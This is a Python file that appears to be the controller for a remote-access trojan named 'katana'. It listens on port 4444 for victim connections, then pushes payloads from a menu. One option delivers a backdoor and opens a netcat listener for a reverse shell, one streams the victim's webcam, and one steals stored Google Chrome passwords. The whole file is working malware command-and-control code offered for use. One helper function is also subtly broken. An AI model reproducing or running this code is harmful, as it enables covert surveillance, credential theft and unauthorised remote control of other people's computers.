import os, socket, subprocess, threading, time, sys, cv2, base64, numpy
import struct

from io import BytesIO
def send_msg(sock, msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)

def recv_msg(sock):
	raw_msglen = recvall(sock, 4)
	if not raw_msglen:
		return None
	msglen = struct.unpack('>I', raw_msglen)[0]
	return recvall(sock, msglen)
def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.append(packet)
    return data
def connect():
	f=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	f.bind(('0.0.0.0', 4444))
	f.listen(1)
	s, addr=f.accept()
	plat=s.recv(4096).decode()
	print("Got connection from: ", addr, " Platform: ", plat, "\n")
	return s

s=connect()
def shell():
	global s
	p=subprocess.Popen("xterm -e nc -nvlp 2222", shell=True)
	p.wait()
def stream():
	global s 
	k=subprocess.Popen("xterm -e python3 test.py", shell=True)
	k.wait()
def password():
	global s
	m=subprocess.Popen("xterm -e python3 chrome_recieve.py", shell=True)
	m.wait()
	
def control():
	global s, shell_count, addr
	while True:
		command=input("\t\t\t\tWelcome to katana\n1-->Shell access\n2-->Webcam stream\n3-->Get google passwords\nWARNING=>>Access shell at the end or the code may break\nChoose: ")
		if(command=="1"):
			s.send(b'shell')
			file = open("backdoor.py", mode='r')
			payload=file.read()
			file.close()
			payload=payload.encode()
			s.send(payload)
			print("Shell payload delivered")
			shell_thread=threading.Thread(target=shell)
			shell_thread.start()
		elif(command=="2"):
			s.send(b'stream')
			file = open("new.py", mode='r')
			payload=file.read()
			file.close()
			payload=payload.encode()
			s.send(payload)
			print("Stream payload delivered")
			stream_thread=threading.Thread(target=stream)
			stream_thread.start()
		elif(command=="3"):
			s.send(b"password")
			file = open("chrome.exe", mode='rb')
			pay=file.read()
			file.close()
			payload=pay
			print(len(payload))
			send_msg(s, payload)
			print("Password payload delivered")
			password_thread=threading.Thread(target=password)
			password_thread.start()
			
				
				
control()

